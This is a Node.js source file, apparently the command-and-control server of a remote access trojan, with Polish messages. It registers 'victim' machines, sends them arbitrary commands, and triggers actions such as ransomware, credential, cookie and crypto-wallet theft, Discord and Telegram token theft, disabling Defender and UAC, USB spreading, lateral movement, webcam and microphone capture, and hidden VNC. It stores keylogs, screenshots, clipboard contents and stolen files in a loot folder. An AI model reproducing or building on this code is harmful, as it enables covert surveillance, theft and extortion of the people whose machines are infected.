const express = require('express');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 10 * 1024 * 1024, cors: { origin: '*' } });

app.use(cors());
app.use(express.json({ limit: '50mb' }));

const LOOT = './loot';
if (!fs.existsSync(LOOT)) fs.mkdirSync(LOOT);

let clients = {};
let responses = {};
let keylogs = {};
let screenshots = {};
let credentials = {};
let processes = {};
let clipboardLog = {};

app.get('/api/clients', (req, res) => {
    const list = Object.values(clients).filter(c => c.type === 'victim').map(c => ({
        id: c.id, ip: c.ip, hostname: c.hostname, user: c.user, os: c.os,
        online: c.online, cpu: c.cpu, gpu: c.gpu, ram: c.ram, resolution: c.resolution,
        country: c.country, lat: c.lat, lon: c.lon, uptime: c.uptime, lastSeen: c.lastSeen
    }));
    res.json(list);
});

app.get('/api/stats', (req, res) => {
    const all = Object.values(clients).filter(c => c.type === 'victim');
    const online = all.filter(c => c.online).length;
    const total = all.length;
    const today = all.filter(c => c.lastSeen && new Date(c.lastSeen).toDateString() === new Date().toDateString()).length;
    res.json({ total, online, today });
});

app.get('/api/send_cmd', (req, res) => {
    const { clientId, cmd } = req.query;
    if (!clientId || !cmd) return res.status(400).send('Brak');
    io.to(clientId).emit('cmd', cmd);
    res.send('OK');
});

app.get('/api/responses/:clientId', (req, res) => {
    res.send((responses[req.params.clientId] || []).join('\n---\n') || 'Brak');
});

app.get('/api/keylogs/:clientId', (req, res) => {
    res.send((keylogs[req.params.clientId] || []).join('\n') || 'Brak');
});

app.get('/api/screenshots/:clientId', (req, res) => {
    res.json(screenshots[req.params.clientId] || []);
});

app.get('/api/screenshot/:clientId/:filename', (req, res) => {
    const p = `${LOOT}/${req.params.clientId}/${req.params.filename}`;
    if (fs.existsSync(p)) res.sendFile(require('path').resolve(p));
    else res.status(404).send('Brak');
});

app.get('/api/credentials/:clientId', (req, res) => {
    res.json(credentials[req.params.clientId] || {});
});

app.get('/api/clipboard/:clientId', (req, res) => {
    res.send((clipboardLog[req.params.clientId] || []).join('\n---\n') || 'Brak');
});

app.get('/api/processes/:clientId', (req, res) => {
    res.json(processes[req.params.clientId] || []);
});

const actions = ['files','download_file','upload_file','process_kill','process_start','power','bsod',
    'ransomware','steal_crypto','steal_discord','steal_steam','steal_telegram','steal_outlook',
    'proxy_start','proxy_stop','scan_network','lateral_move','cleanse','update','selfdestruct',
    'webcam_snap','mic_record','hvnc_start','hvnc_stop','hidden_browser','auto_fill','clipboard_grab',
    'fake_login','web_inject','wifi_steal','geolocate','wallpaper','play_sound','chat_msg',
    'disable_defender','cookie_steal','record_screen','kill_input','hide_cursor','cd_tray',
    'simulate_click','miner_start','miner_stop','serial_keys','check_av','disable_updates',
    'add_firewall','uac_off','system_report','inject_process','usb_spread'];

actions.forEach(a => {
    app.get(`/api/${a}`, (req, res) => {
        io.to(req.query.clientId).emit(a, req.query);
        res.send('OK');
    });
});

io.on('connection', (socket) => {
    const clientType = socket.handshake.query.type || 'victim';
    const clientId = socket.handshake.query.id || socket.id;
    const ip = socket.handshake.address;
    
    // TYLKO jeśli to victim, dodaj do listy
    if (clientType === 'victim') {
        clients[clientId] = {
            id: clientId, ip: ip, socketId: socket.id, online: true, type: 'victim',
            hostname: '', user: '', os: '', cpu: '', gpu: '', ram: '',
            resolution: '', country: '', lat: 0, lon: 0, uptime: '', lastSeen: new Date().toISOString()
        };
        responses[clientId] = responses[clientId] || [];
        keylogs[clientId] = keylogs[clientId] || [];
        screenshots[clientId] = screenshots[clientId] || [];
        clipboardLog[clientId] = clipboardLog[clientId] || [];
    }
    
    socket.on('register', (data) => {
        if (clientType === 'victim' && clients[clientId]) {
            Object.assign(clients[clientId], data, { online: true, lastSeen: new Date().toISOString() });
        }
    });

    socket.on('response', (data) => {
        if (responses[clientId]) {
            responses[clientId].push(`[${new Date().toLocaleTimeString()}] ${data}`);
            if (responses[clientId].length > 200) responses[clientId].shift();
        }
    });

    socket.on('keylog', (data) => {
        if (keylogs[clientId]) {
            keylogs[clientId].push(data);
            if (keylogs[clientId].length > 500) keylogs[clientId].shift();
        }
    });

    socket.on('screenshot', (data) => {
        const dir = `${LOOT}/${clientId}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const fn = `screen_${Date.now()}.jpg`;
        fs.writeFileSync(`${dir}/${fn}`, Buffer.from(data, 'base64'));
        if (!screenshots[clientId]) screenshots[clientId] = [];
        screenshots[clientId].push({ filename: fn, time: new Date().toISOString() });
        if (screenshots[clientId].length > 100) screenshots[clientId].shift();
    });

    socket.on('screen_frame', (data) => io.emit(`screen_frame_${clientId}`, data));
    socket.on('webcam_frame', (data) => io.emit(`webcam_frame_${clientId}`, data));
    socket.on('hvnc_frame', (data) => io.emit(`hvnc_frame_${clientId}`, data));
    
    socket.on('webcam_snap', (data) => {
        const dir = `${LOOT}/${clientId}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(`${dir}/webcam_${Date.now()}.jpg`, Buffer.from(data, 'base64'));
    });

    socket.on('credentials', (data) => { credentials[clientId] = data; });
    socket.on('processes', (data) => { processes[clientId] = data; });
    socket.on('clipboard_data', (data) => {
        if (clipboardLog[clientId]) {
            clipboardLog[clientId].push(data);
            if (clipboardLog[clientId].length > 200) clipboardLog[clientId].shift();
        }
    });
    
    socket.on('file_data', (data) => {
        const dir = `${LOOT}/${clientId}/downloads`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(`${dir}/${data.name}`, Buffer.from(data.data, 'base64'));
    });

    socket.on('mic_data', (data) => {
        const dir = `${LOOT}/${clientId}`;
        fs.writeFileSync(`${dir}/mic_${Date.now()}.wav`, Buffer.from(data, 'base64'));
    });

    socket.on('video_data', (data) => {
        const dir = `${LOOT}/${clientId}`;
        fs.writeFileSync(`${dir}/screen_rec_${Date.now()}.mp4`, Buffer.from(data, 'base64'));
    });

    socket.on('geolocate', (data) => {
        if (clients[clientId]) {
            clients[clientId].country = data.country;
            clients[clientId].lat = data.lat;
            clients[clientId].lon = data.lon;
        }
    });

    socket.on('disconnect', () => {
        if (clients[clientId]) {
            clients[clientId].online = false;
            clients[clientId].lastSeen = new Date().toISOString();
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Serwer na porcie ' + PORT));
